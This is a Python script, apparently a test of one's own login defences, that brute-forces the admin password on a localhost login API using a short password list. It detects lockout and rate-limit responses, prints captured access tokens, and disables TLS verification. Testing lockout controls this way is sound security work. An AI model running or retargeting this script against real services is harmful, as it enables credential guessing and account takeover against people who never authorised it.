import requests
import json
import time

TARGET_URL = "https://localhost:8443/api/auth/login"
USERNAME = "admin"
PASSWORDS = ["12345", "password", "admin123", "qwerty", "letmein", "wrongpass", "anotherone", "securesignal"]

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run_brute_force():
    print(f"[*] Starting Brute Force Attack Simulation on {TARGET_URL}")
    print(f"[*] Target Username: {USERNAME}")
    print(f"[*] Payload List Size: {len(PASSWORDS)}")
    print("-" * 40)
    
    for i, password in enumerate(PASSWORDS):
        print(f"[{i+1}/{len(PASSWORDS)}] Trying password: {password}...")
        
        data = {
            "username": USERNAME,
            "password": password
        }
        
        try:
            response = requests.post(TARGET_URL, data=data, verify=False, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] SUCCESS! Valid credentials found - Password: {password}")
                print(f"    Token: {response.json().get('access_token')[:20]}...")
                break
            elif response.status_code == 400:
                print(f"[-] Failed: Incorrect credentials. (Status: {response.status_code})")
            elif response.status_code == 403:
                print(f"[!] BLOCKED: Account Lockout / IP Block activated! (Status: {response.status_code})")
                print(f"    Message: {response.json().get('detail')}")
                break
            elif response.status_code == 429:
                print(f"[!] RATE LIMITED: Too many requests! (Status: {response.status_code})")
                time.sleep(2) 
            else:
                print(f"[?] Unexpected Response: {response.status_code} - {response.text}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to target: {e}")
            break
            
        time.sleep(0.5)
        
    print("-" * 40)
    print("[*] Brute Force Simulation Completed.")

if __name__ == "__main__":
    run_brute_force()
